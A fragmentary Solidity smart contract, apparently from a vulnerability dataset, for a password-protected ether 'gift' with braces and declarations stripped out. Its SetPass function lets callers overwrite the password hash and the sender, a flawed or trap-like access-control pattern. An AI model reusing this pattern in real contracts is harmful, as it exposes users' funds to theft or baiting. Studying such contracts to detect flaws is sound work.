14961.sol
function GetGift(bytes pass) external payable
if(hashPass == keccak256(pass) && now>giftTime)
msg.sender.transfer(this.balance);
function GetGift() public payable
if(msg.sender==reciver && now>giftTime)
msg.sender.transfer(this.balance);
bytes32 hashPass;
bool closed = false;
address sender;
address reciver;
uint giftTime;
function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
function SetPass(bytes32 hash) public payable
if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
hashPass = hash;
sender = msg.sender;
giftTime = now;
function SetGiftTime(uint date) public
if(msg.sender==sender)
giftTime = date;